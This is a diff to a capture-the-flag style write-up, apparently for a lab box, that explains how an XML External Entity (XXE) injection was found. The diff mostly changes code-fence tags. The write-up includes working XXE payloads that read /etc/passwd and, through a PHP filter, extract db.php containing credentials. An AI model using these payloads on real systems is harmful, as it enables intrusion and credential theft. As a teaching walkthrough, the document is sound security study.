@@ -63,7 +63,7 @@ data=PD94bWwgIHZlcnNpb24(...)
 ```
 
 The value of the parameter _data_ is Base64 encoded and when decoding, it shows that it is **XML** data:
-```
+```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 		<bugreport>
 		<title>Test1</title>
@@ -75,38 +75,33 @@ The value of the parameter _data_ is Base64 encoded and when decoding, it shows 
 
 When seeing XML in a HTTP request, a recommendation is to test for **XML External Entity Injection (XXE)**.
 Several payloads can be found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) and we can test a basic request:
-```
+```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 		<bugreport>
 		<title>&example;</title>
 		<cwe>Test2</cwe>
 		<cvss>1</cvss>
 		<reward>2</reward>
-    </bugreport>
+		</bugreport>
 ```
 
 After Base64-encoding and URL-encoding the data, the entity will be parsed and displays _"Doe"_ in the specified tags.
 
 Testing to retrieve _/etc/passwd_ file:
-```
+```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
 		<bugreport>
 		<title>&test;</title>
-		<cwe>Test2</cwe>
-		<cvss>1</cvss>
-		<reward>2</reward>
-		</bugreport>
+(...)
 ```
 
 It works and the vulnerability can be used to read files of the web service like _db.php_.
 As PHP files have many special characters, it is possible to extract them with a **PHP filter**:
-```
+```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
 		<bugreport>
 		<title>&xxe;</title>
-		<cwe>Test2</cwe>
-		<cvss>1</cvss>
-		<reward>2</reward>
+(...)
 ```
 
 The file can now be Base64-decoded and it contains credentials:
